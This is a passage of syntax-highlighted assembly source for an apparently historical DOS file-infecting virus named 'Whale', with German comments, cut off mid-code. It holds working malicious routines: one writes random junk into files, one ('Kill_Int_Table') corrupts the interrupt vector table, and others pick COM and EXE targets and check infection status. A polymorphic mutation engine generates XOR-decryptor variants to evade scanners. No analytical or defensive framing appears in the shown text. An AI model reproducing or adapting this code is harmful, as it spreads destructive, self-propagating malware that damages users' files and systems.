                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03990</span><span class="sc0">          </span><span class="sc1">; sonst "decode" scharfmachen</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------( trash )---</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">00A72h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">00B73H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0FEE9H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0E9F2h</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">43H</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03936</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B87</span><span class="sc0">                  </span><span class="sc1">; = push si, jmp decode</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( Schreibt MÅll in Datei )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Write_Trash_To_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">61</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TrashFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0396A</span><span class="sc0">          </span><span class="sc1">; falls "0" nichts tun</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0400h</span><span class="sc0">        </span><span class="sc1">; DX = 400h</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; CX = 0xxxh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; WRITE File</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">J0396A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">61</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------( trash )---</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">089H</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0e8H</span><span class="sc0">
</span><span class="sc1">;========================================================()===========</span><span class="sc0">
</span><span class="sc5">J0397A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,+</span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">62</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J039EC</span><span class="sc0">          </span><span class="sc1">; ist die Datei ausfÅhrbar ?</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================================( Decode scharfmachen )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03990</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">SwapCode_1</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc1">; JMP erzeugen</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03A1C</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================================( zerstîrt die INT-Tabelle )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Kill_Int_Table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23F1h</span><span class="sc0">        </span><span class="sc1">; 4C01</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Eh</span><span class="sc0">        </span><span class="sc1">; CX = 0Eh</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; ES = 0000</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc5">J039AF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Hole zufallszahl</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; zerstoere INT-Tabelle</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; durch 14 Zufalls-Werte !</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; Die in [bx] gemerkt werden</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J039AF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">63</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================( check auf ausfÅhrbare Datei )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J039C3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0050h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0"> </span><span class="sc1">; Laufwerk im Filenamen ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J039E1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Ja, dann Buchstabe nach BL</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; HEX-ZAHL drausmachen</span><span class="sc0">
</span><span class="sc5">J039E1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2428</span><span class="sc4">],</span><span class="sc8">BL</span><span class="sc0">        </span><span class="sc1">; und in die DRIVE-Variable</span><span class="sc0">
                </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">                </span><span class="sc1">; ENDE des Filenamens suchen</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------( Erkennung der Datei-Extension )---</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J039EC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">65</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ENDE - 3, ist EXTENSION</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">            </span><span class="sc1">; Gross-Schrift</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">              </span><span class="sc1">; Gross-schrift</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">EXE_FLAG</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------( Angenommen, es war ein COM, dann gilt :  )-------------</span><span class="sc0">
</span><span class="sc1">;------------( AND AX,0DFDF : AX = 4D4F  / 'MO'         )-------------</span><span class="sc0">
</span><span class="sc1">;------------( ADD AH,AL    : AX = 9C4F                 )-------------</span><span class="sc0">
</span><span class="sc1">;------------( MOV AL,[Di-4]: AX = 9C43  / 'xC'         )-------------</span><span class="sc0">
</span><span class="sc1">;------------( ADD AL,AH    ; AX = 9CDF                 )-------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------( BEI EXE kommt AL=E2 heraus, bei COM AL=DF)-------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">              </span><span class="sc1">; Also : IST ES EIN COM ?</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">65</span><span class="sc0">
</span><span class="sc5">J03A0C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03A17</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">EXE_FLAG</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">              </span><span class="sc1">; Also : IST ES EIN EXE ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03A23</span><span class="sc0">               </span><span class="sc1">; Weder COM noch EXE</span><span class="sc0">
</span><span class="sc5">J03A17</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">  </span><span class="sc1">; COM oder EXE</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">                          </span><span class="sc1">; Carry-Flag lîschen</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================( JMP wird zeitweise erzeugt )===</span><span class="sc0">
</span><span class="sc1">;====================================( Einziger JMP zum Relokator )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03A1C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J03A20</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Relokator</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03A23</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">   </span><span class="sc1">; Weder COM noch EXE</span><span class="sc0">
</span><span class="sc5">J03A26</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">STC</span><span class="sc0">                           </span><span class="sc1">; Carry-Flag setzen</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2Dh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================================( Get current PSP )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">GET_Current_PSP</span><span class="sc4">:</span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">66</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">66</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================(--------------------------------------)===</span><span class="sc0">
</span><span class="sc1">;==========================(     HIER ENTSTEHEN DIE MUTANTEN !    )===</span><span class="sc0">
</span><span class="sc1">;==========================(--------------------------------------)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mutate_Whale</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">67</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">                 </span><span class="sc1">; AH = 40h !</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">InfectFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Hab schon infiziert !</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03A7C</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Zufallszahl holen</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; nur jedes 2 Mal arbeiten</span><span class="sc0">

</span><span class="sc5">J03A55</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J03A7C</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Decode_3A84</span><span class="sc0">             </span><span class="sc1">; Bereich 3A84h...436Ch</span><span class="sc0">

</span><span class="sc5">J03A5A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Zufallszahl holen</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">                  </span><span class="sc1">; kleiner als 1eh / 30d</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J03A5A</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">M_SIZE</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Zufallszahl * 4Ch / 76d</span><span class="sc0">
                                                </span><span class="sc1">; AX : 0000....08E8</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                                                </span><span class="sc1">; AX : 1274....1B5C</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; ES=DS=CS</span><span class="sc0">

                                                </span><span class="sc1">;======================</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; Quelle : 1274....1B5C</span><span class="sc0">
                                                </span><span class="sc1">; bzw.     3A84....436C</span><span class="sc0">
                                                </span><span class="sc1">; in StÅcken zu 4Ch !!!</span><span class="sc0">
                                                </span><span class="sc1">;======================</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D4BB5</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">M_SIZE</span><span class="sc0">               </span><span class="sc1">; 4C Byte von CS:SI</span><span class="sc0">
                                                </span><span class="sc1">; nach CS:23A5/4BB5</span><span class="sc0">
                                                </span><span class="sc1">; schaufeln</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Code_3A84</span><span class="sc0">               </span><span class="sc1">; Bereich 3A84h...436Ch</span><span class="sc0">

</span><span class="sc5">J03A7C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">67</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;=================================( dieser Code steht immer davor )===</span><span class="sc0">
</span><span class="sc1">;Code_Whale:    PUSH    CX</span><span class="sc0">
</span><span class="sc1">;               PUSH    BX</span><span class="sc0">
</span><span class="sc1">;               MOV     BX,FirstByte</span><span class="sc0">
</span><span class="sc1">;               MOV     CX,Code_len     ; 2385h ; Wal-Size bis J04BB5</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;       Die Nummerierung der Mutanten folgt dem TBSCAN.DAT-File</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT # 3)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">MUT_3</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J03A84</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">STD</span><span class="sc0">                             </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">DreiByte</span><span class="sc0">             </span><span class="sc1">; 0BD8h</span><span class="sc0">
</span><span class="sc5">J03A88</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">1326h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J03A88</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J03AB8</span><span class="sc0">
                </span><span class="sc1">;--------( einsprung ) ---------( -1131 )------------</span><span class="sc0">
</span><span class="sc5">J03A9B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; = 4BCC, SI = 100h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03AA1</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">6945h</span><span class="sc0">                   </span><span class="sc1">; 4BD0</span><span class="sc0">

</span><span class="sc5">J03AA1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DX = 4BD0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">23A0H</span><span class="sc0">                </span><span class="sc1">; DX = 2830</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">DreiByte</span><span class="sc0">             </span><span class="sc1">; CX = 0BD8</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; DX = 100h, SI = 2830</span><span class="sc0">
</span><span class="sc5">J03AAD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1326h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">03h</span><span class="sc0">
